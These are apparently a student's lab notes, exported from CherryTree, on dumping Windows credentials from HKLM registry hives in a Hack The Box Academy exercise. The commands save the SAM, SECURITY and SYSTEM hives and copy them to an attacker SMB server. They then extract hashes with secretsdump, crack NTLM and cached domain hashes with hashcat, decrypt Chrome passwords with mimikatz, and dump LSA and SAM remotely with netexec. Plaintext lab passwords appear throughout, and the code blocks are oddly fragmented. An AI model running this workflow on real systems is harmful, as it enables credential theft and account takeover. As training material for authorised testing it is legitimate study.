---
title: "HKLM Registries"
date: 2026-01-02
summary: "cmd.exe"
tags: ["password-attack", "hklm-registries"]
source: "cherrytree"
---

```text
cmd.exe
```
 with administrative privileges, we can use
```text
reg.exe
```
 to save copies of the registry hives.

To transer:

start local smb server:
```text
sudo
```
```text
 python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

move from windows over:
```text
C:\> move sam.save \\10.10.15.16\CompData
```

For secret dumping:

```text
locate
```
```text
 secretsdump
```

```text
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

pupulate file:
```text
sudo
```
```text

```
```text
vim
```
```text
 hashestocrack.txt
```
crack:
```text
sudo
```
```text
 hashcat -m
```
```text
1000
```
```text
 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

for cached hashes:
```text
hashcat -m
```
```text
2100
```
```text

```
```text
'$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25'
```
```text
 /usr/share/wordlists/rockyou.txt
```

DPAPI encrypted credentials can be decrypted manually with tools like Impacket's
[dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py)
,
[mimikatz](https://github.com/gentilkiwi/mimikatz)
, or remotely with
[DonPAPI](https://github.com/login-securite/DonPAPI)
.

```text
C:\Users\Public> mimikatz.exe
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
> Encrypted Key found in local state file
> Encrypted Key seems to be protected by DPAPI
 * using CryptUnprotectData API
> AES Key is: efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c

URL     : http://10.10.14.94/ ( http://10.10.14.94/login.html )
Username: bob
 * using BCrypt with AES-256-GCM
Password: April2025!
```

Dumping LSA secrets remotely

```text
netexec smb
```
```text
10.129
```
```text
.42.198 --local-auth -u bob -p HTB_@cademy_stdnt
```
```text
!
```
```text
 --lsa
```

Dumping SAM Remotely

n
```text
etexec smb
```
```text
10.129
```
```text
.42.198 --local-auth -u bob -p HTB_@cademy_stdnt
```
```text
!
```
```text
 --sam
```
